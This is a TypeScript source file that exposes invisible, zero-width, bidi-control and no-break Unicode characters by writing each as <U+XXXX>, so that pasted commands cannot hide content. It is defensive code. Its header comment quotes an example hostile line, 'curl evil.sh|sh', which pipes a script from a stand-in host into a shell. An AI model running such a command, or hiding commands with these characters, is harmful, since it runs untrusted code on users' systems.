// Characters a text box does not draw as themselves (#2615) — controls it draws as nothing, zero-width,
// format and default-ignorable characters (variation selectors, the tag block, Hangul fillers), bidi
// controls that reorder what is around them, and blanks that do not break a line (a run of them pushes
// the rest of the line out of sight). With them a line can read `true; #;curl evil.sh|sh` and paste as
// `true; curl evil.sh|sh;# `, so a block shown before it is copied writes each one out as `<U+XXXX>`.
//
// Decided by Unicode property rather than a list of ranges, which missed whole classes. Left alone:
// space, tab, newline, CRLF, the ideographic space, and the joiner and selector inside an emoji (`❤️`, a ZWJ family), which a
// text box draws as the emoji — flagging those would make the warning cry wolf on ordinary text.
//
// Pure: text in, the text with each one written out and how many there were out.

// Unassigned code points (Cn) and the object-replacement character are drawn as blanks by some
// fonts, so a run of them hides what follows as well as a run of no-break spaces does.
const INVISIBLE = /[\p{Cc}\p{Cf}\p{Cn}\p{Zs}\p{Zl}\p{Zp}\p{Co}\p{Default_Ignorable_Code_Point}\u2800\uFFFC]/u;
const PICTOGRAPHIC = /[\p{Extended_Pictographic}\p{Emoji_Modifier}]/u;
const KEYCAP_BASE = /[0-9#*]/;
// Space; tab and newline; and the ideographic space, which breaks a line like a space does, so a
// run of it cannot push anything out of view (and it is in every other Japanese sentence).
const DRAWN_AS_ITSELF = new Set([" ", "\t", "\n", "\u3000"]);
const PRESENTATION_SELECTORS = new Set(["\uFE0E", "\uFE0F"]);
const ZERO_WIDTH_JOINER = "\u200D";

/** A selector right after its emoji, or a joiner between two (past one selector) — drawn as the emoji.
 *  Only ONE selector is ever part of an emoji, so a second one after it is hidden like any other. */
function isPartOfEmoji(characters: string[], index: number): boolean {
  const character = characters[index] ?? "";
  const before = characters[index - 1] ?? "";
  if (PRESENTATION_SELECTORS.has(character)) return PICTOGRAPHIC.test(before) || KEYCAP_BASE.test(before);
  if (character !== ZERO_WIDTH_JOINER) return false;
  const base = PRESENTATION_SELECTORS.has(before) ? (characters[index - 2] ?? "") : before;
  return PICTOGRAPHIC.test(base) && PICTOGRAPHIC.test(characters[index + 1] ?? "");
}

function isHiddenAt(characters: string[], index: number): boolean {
  const character = characters[index] ?? "";
  if (DRAWN_AS_ITSELF.has(character)) return false;
  // A CR alone is drawn as a line break but pasted as Enter; in CRLF it is part of the line ending.
  if (character === "\r") return characters[index + 1] !== "\n";
  return INVISIBLE.test(character) && !isPartOfEmoji(characters, index);
}
const HEX_DIGITS = 4;
const marker = (character: string): string => `<U+${(character.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(HEX_DIGITS, "0")}>`;

export interface RevealedText {
  /** The text with every hidden character written as `<U+XXXX>`. */
  shown: string;
  hidden: number;
}

export function revealHidden(text: string): RevealedText {
  const characters = [...text];
  const hiddenAt = characters.map((_, index) => isHiddenAt(characters, index));
  return {
    shown: characters.map((character, index) => (hiddenAt[index] ? marker(character) : character)).join(""),
    hidden: hiddenAt.filter(Boolean).length,
  };
}
